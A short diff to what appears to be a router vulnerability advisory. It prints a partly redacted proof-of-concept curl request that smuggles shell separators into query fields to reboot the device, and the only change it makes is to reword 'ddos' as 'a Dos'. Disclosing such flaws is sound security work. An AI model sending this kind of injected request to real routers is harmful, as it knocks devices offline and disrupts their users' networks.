@@ -18,7 +18,7 @@ And then our automated vulnerability detection tool discovered a remote code exe
 POC: 
 curl 'http://ip:port/*****.asp?action=set&MAC=1&IP=;&DeviceRename=1&isBind=1&ifType=reboot&BlockUser=-f;&UpMax=0&DownMax=0'
 
-This poc can reboot the router, resulting in ddos. 
+This poc can reboot the router, resulting in a Dos. 
 p.s.Given the vendor's security, we only provided part of the URL.
   
            
